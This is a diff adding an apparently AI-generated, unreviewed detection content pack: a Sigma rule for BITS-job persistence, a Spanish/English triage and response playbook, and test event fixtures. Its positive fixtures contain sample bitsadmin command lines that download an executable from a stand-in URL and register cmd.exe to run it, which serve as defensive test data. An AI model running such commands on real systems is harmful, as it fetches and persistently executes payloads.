@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "b9cbbc17-d00d-4e3d-a827-b06d03d2380d",
+    "title": "Monitoring For Persistence Via BITS",
+    "level": "medium",
+    "status": "test",
+    "author": "Sreeman",
+    "path": "windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1197"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "bitsadmin.exe se ejecutó para registrar un comando de notificación (cmd.exe, %COMSPEC% o regsvr32.exe) o para agregar un archivo remoto (http, https, ftp) a un job de BITS. Esto puede indicar descarga de malware o persistencia mediante BITS.",
+      "what_it_detects": "Eventos de creación de procesos donde Image u OriginalFileName es bitsadmin.exe y CommandLine contiene /SetNotifyCmdLine junto con cmd.exe, %COMSPEC% o regsvr32.exe, o bien /Addfile junto con una URL http:, https:, ftp: o ftps:.",
+      "why_it_matters": "Un atacante puede abusar de los jobs de BITS (ATT&CK T1197) para descargar payloads con un binario firmado por Microsoft y ejecutarlos al terminar la descarga. El job sobrevive a reinicios y sirve como persistencia sigilosa.",
+      "triage_steps": [
+        "Revise CommandLine completo: nombre del job, URL de /Addfile, ruta local de destino y comando registrado con /SetNotifyCmdLine.",
+        "Identifique ParentImage y la cadena de procesos padre; desconfíe de Office, wscript, mshta, powershell o un servicio web como padre.",
+        "Valide el usuario y si la ejecución fue interactiva, por un script de despliegue o por una cuenta de servicio.",
+        "Busque otras ejecuciones de bitsadmin en el mismo host +/- 15 minutos (/create, /resume, /SetMinRetryDelay) para reconstruir el job completo.",
+        "Consulte la reputación del dominio o IP de la URL y revise el tráfico de red y DNS del host hacia ese destino.",
+        "Obtenga el hash del archivo descargado y del binario de notificación; revise procesos hijos de svchost (BITS) que ejecuten cmd.exe o regsvr32.exe.",
+        "Liste los jobs activos con 'bitsadmin /list /allusers /verbose' o Get-BitsTransfer -AllUsers y revise alertas previas para el host y el usuario."
+      ],
+      "false_positives": [
+        "Scripts de despliegue de software o de administración que usan bitsadmin para descargar instaladores desde servidores internos o del proveedor.",
+        "Herramientas de actualización heredadas que registran un comando de notificación para lanzar el instalador al terminar la descarga."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del host o del script si el job de BITS es legítimo antes de actuar.",
+        "Si es malicioso, aísle el endpoint y bloquee la URL o el dominio en el proxy y el firewall.",
+        "Cancele el job con 'bitsadmin /cancel <job>' tras documentarlo y ponga en cuarentena los archivos descargados.",
+        "Busque el mismo hash, URL y nombre de job en toda la flota; rote las credenciales del usuario si hubo compromiso."
+      ],
+      "severity_rationale": "Medium es adecuado porque bitsadmin con estas opciones tiene usos administrativos legítimos, pero el patrón coincide con técnicas conocidas de descarga y persistencia y requiere revisión."
+    },
+    "en": {
+      "summary": "bitsadmin.exe was run to register a notify command (cmd.exe, %COMSPEC% or regsvr32.exe) or to add a remote file (http, https, ftp) to a BITS job. This may indicate malware download or persistence via BITS.",
+      "what_it_detects": "Process creation events where Image or OriginalFileName is bitsadmin.exe and CommandLine contains /SetNotifyCmdLine with cmd.exe, %COMSPEC% or regsvr32.exe, or /Addfile with an http:, https:, ftp: or ftps: URL.",
+      "why_it_matters": "Attackers abuse BITS jobs (ATT&CK T1197) to download payloads with a Microsoft-signed binary and run them when the transfer completes. Jobs survive reboots, providing stealthy persistence.",
+      "triage_steps": [
+        "Read the full CommandLine: job name, /Addfile URL, local destination path and the command registered with /SetNotifyCmdLine.",
+        "Identify ParentImage and the process ancestry; be suspicious of Office, wscript, mshta, powershell or a web server as parent.",
+        "Check the user and whether execution was interactive, from a deployment script or a service account.",
+        "Look for other bitsadmin runs on the same host +/- 15 minutes (/create, /resume, /SetMinRetryDelay) to rebuild the whole job.",
+        "Check reputation of the URL's domain or IP and review the host's network and DNS traffic to it.",
+        "Hash the downloaded file and the notify binary; review svchost (BITS) child processes running cmd.exe or regsvr32.exe.",
+        "List active jobs with 'bitsadmin /list /allusers /verbose' or Get-BitsTransfer -AllUsers and review earlier alerts for the host and user."
+      ],
+      "false_positives": [
+        "Software deployment or admin scripts using bitsadmin to fetch installers from internal or vendor servers.",
+        "Legacy updaters that register a notify command to launch the installer after the download finishes."
+      ],
+      "response_steps": [
+        "Confirm with the host or script owner whether the BITS job is legitimate before acting.",
+        "If malicious, isolate the endpoint and block the URL or domain at the proxy and firewall.",
+        "Cancel the job with 'bitsadmin /cancel <job>' after documenting it, and quarantine downloaded files.",
+        "Hunt for the same hash, URL and job name fleet-wide; rotate the user's credentials if compromise is confirmed."
+      ],
+      "severity_rationale": "Medium fits because bitsadmin with these options has legitimate admin uses, but the pattern matches known download and persistence tradecraft and needs review."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "bitsadmin registers cmd.exe as the notify command to run a downloaded payload",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin /SetNotifyCmdLine updjob C:\\Windows\\System32\\cmd.exe \"/c C:\\Users\\Public\\upd.exe\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat"
+        }
+      },
+      {
+        "description": "bitsadmin adds a remote HTTPS file to a job (lowercase /addfile still matches case-insensitively)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin /addfile updjob https://cdn.example.org/files/upd.exe C:\\Users\\Public\\upd.exe",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -NoProfile -File C:\\Users\\Public\\s.ps1"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "bitsadmin lists jobs; neither /SetNotifyCmdLine nor /Addfile is present",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\admin.soporte",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin /list /allusers /verbose",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "bitsadmin adds a file from an internal UNC share, with no http/https/ftp URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin /addfile pkgjob \\\\fs01.andes.example.com\\pkgs\\agent.msi C:\\Temp\\agent.msi",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
